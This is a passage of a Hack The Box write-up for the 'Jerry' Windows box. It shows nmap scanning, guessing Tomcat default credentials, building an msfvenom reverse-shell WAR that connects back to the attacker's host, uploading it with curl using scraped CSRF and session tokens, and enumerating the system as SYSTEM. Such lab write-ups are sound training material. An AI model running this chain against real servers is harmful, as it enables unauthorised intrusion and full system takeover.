@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Windows box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;jerry#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Jerry<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-11-02</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/jerry/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#host-10-10-10-95">Host 10.10.10.95</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#apache-tomcat">Apache Tomcat</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#foothold-file-upload">Foothold (File upload)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#hotfixes">Hotfixes</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#nics">NICs</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#flags">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2018-06-30</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/2570">mrh4sh</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-95">Host <code>10.10.10.95</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Jerry using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.95<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE
+</span><span class="z-text z-plain">8080/tcp open  http-proxy
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.95<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the service associated
+with the open TCP port we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.95<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>8080<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE VERSION
+</span><span class="z-text z-plain">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP service to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.95<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>8080<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE
+</span><span class="z-text z-plain">8080/tcp open  http-proxy
+</span><span class="z-text z-plain">|_http-favicon: Apache Tomcat
+</span><span class="z-text z-plain">|_http-title: Apache Tomcat/7.0.88
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script detected that the website's homepage title is 'Apache
+Tomcat/7.0.88', so we can assume that it's using Apache Tomcat version <code>7.0.88</code>.</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="apache-tomcat">Apache Tomcat</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.95:8080/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/jerry/apache-tomcat-homepage.png" alt="Apache Tomcat homepage" /></p>
+<p>This is the standard homepage for Apache Tomcat.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/jerry/apache-tomcat-homepage-wappalyzer.png" alt="Apache Tomcat homepage Wappalyzer extension" /></p>
+<p>Nothing.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>A common way to get RCE with this application is by uploading a custom WAR file.
+However, to access this functionality, we need to be authenticated.</p>
+<p>If we search online for Apache Tomcat's default credentials, we find a
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt">wordlist</a>
+from <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.</p>
+<p>I launched a Sniper attack on Burp Suite to test these credentials. Here's the result:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/jerry/burp-default-credentials-attack.png" alt="Burp Suite default credentials attack" /></p>
+<p>The payload <code>dG9tY2F0OnMzY3JldA==</code> is valid, which corresponds to <code>tomcat:s3cret</code>.</p>
+<p>Let's resume our exploration of the website by authenticating to the 'Manager
+App'.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/jerry/apache-tomcat-app-manager.png" alt="Apache Tomcat app manager" /></p>
+<p>Now we have access to the WAR file upload functionality!</p>
+<h2 id="foothold-file-upload">Foothold (File upload)</h2>
+<p>As I said <a href="https://mmezirard.github.io/htb-write-ups/boxes/jerry/#exploration">previously</a>, a common way to get RCE with Apache Tomcat
+is by uploading a custom WAR file. It requires to be authenticated, but we just
+discovered that default credentials were used.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The Metasploit module <code>exploit/multi/http/tomcat_mgr_upload</code> can be used to
+exploit this vulnerability, but it's easy to do manually.</p>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll use <code>msfvenom</code> to generate a <code>java/jsp_shell_reverse_tcp</code> payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>java/jsp_shell_reverse_tcp<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> LHOST=<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.14.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> LPORT=<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>war<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/revshell.war<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>Now, it's time to upload our WAR file. However, to do so, we need a <code>CSRF_NONCE</code>
+and a <code>JSSESSID</code> token.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> RESPONSE=<span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Authorization: Basic dG9tY2F0OnMzY3JldA==<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.95:8080/manager/html<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
+</span></span><span class="z-source z-shell z-bash">  <span class="z-variable z-other z-readwrite z-assignment z-shell">CSRF_NONCE</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>oP</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>&lt;form class=&quot;inline&quot; method=&quot;POST&quot; action=&quot;/manager/html/stop;jsessionid=[^?]+?\?path=/&amp;amp;org.apache.catalina.filters.CSRF_NONCE=\K[^&quot;]+<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
+</span></span><span class="z-source z-shell z-bash">  <span class="z-variable z-other z-readwrite z-assignment z-shell">JSSESSID</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>oP</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Set-Cookie: JSESSIONID=\K[^;]+<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span></code></pre>
+<p>With these values, we can upload our WAR file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Authorization: Basic dG9tY2F0OnMzY3JldA==<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.95:8080/manager/html/upload;jsessionid=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">JSSESSID</span></span>?org.apache.catalina.filters.CSRF_NONCE=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">CSRF_NONCE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>deployWar=@/workspace/revshell.war<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Finally, let's trigger our <code>revshell.war</code> file!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.95:8080/revshell/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>And if we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.95] 49192
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">C:\apache-tomcat-7.0.88&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<p>I'll transform it into a Powershell one.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p>I could just retrieve the flags and call it a day, but for good measure I'll
+still enumerate basic information.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Jerry's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>PROCESSOR_ARCHITECTURE<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">AMD64
+</span></code></pre>
+<p>It's using AMD64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="version">Version</h3>
+<p>Let's gather some information about the Windows version of Jerry.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-List</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Property <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>ProductName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>CurrentBuildNumber<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ProductName        : Windows Server 2012 R2 Standard
+</span><span class="z-text z-plain">CurrentBuildNumber : 9600
+</span></code></pre>
+<p>In fact, it's Windows Server 2012 R2 Standard build <code>9600</code>.</p>
+<h3 id="hotfixes">Hotfixes</h3>
+<p>Let's retrieve the list of installed hotfixes.</p>
